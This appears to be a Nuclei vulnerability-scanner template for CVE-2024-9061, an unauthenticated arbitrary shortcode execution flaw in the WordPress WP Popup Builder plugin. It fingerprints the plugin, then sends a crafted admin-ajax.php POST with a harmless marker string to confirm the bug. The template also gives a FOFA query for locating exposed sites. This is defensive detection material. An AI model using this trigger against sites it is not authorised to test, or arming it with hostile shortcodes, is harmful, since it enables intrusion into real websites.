flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "/wp-content/plugins/wp-popup-builder")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - len(body) == 13
    - contains(body, "CVE-2024-9061")
    - contains(content_type, "text/html")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=shortcode_Api_Add&shortcode=%43%56%45%2d%32%30%32%34%2d%39%30%36%31

    '
id: CVE-2024-9061
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-9061
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cwe-id: CWE-94
    epss-percentile: 0.18015
    epss-score: 0.00046
  description: 'The The WP Popup Builder Popup Forms and Marketing Lead Generation
    plugin for WordPress is vulnerable to arbitrary shortcode execution via the wp_ajax_nopriv_shortcode_Api_Add
    AJAX action in all versions up to, and including, 1.3.5. This is due to the software
    allowing users to execute an action that does not properly validate a value before
    running do_shortcode. This makes it possible for unauthenticated attackers to
    execute arbitrary shortcodes.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wp-popup-builder/"
    framework: wordpress
    max-request: 2
    product: wp-popup-builder
    vendor: themehunk
    verified: true
  name: WP Popup Builder Popup Forms and Marketing Lead Generation <= 1.3.5 - Arbitrary
    Shortcode Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9061
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/0cac1dc0-87dc-43eb-9db1-638a91200b43?source=cve
  - https://github.com/RandomRobbieBF/CVE-2024-9061
  severity: high
  tags: cve,cve2024,wp,wordpress,wp-plugin,wp-popup-builder,shortcode
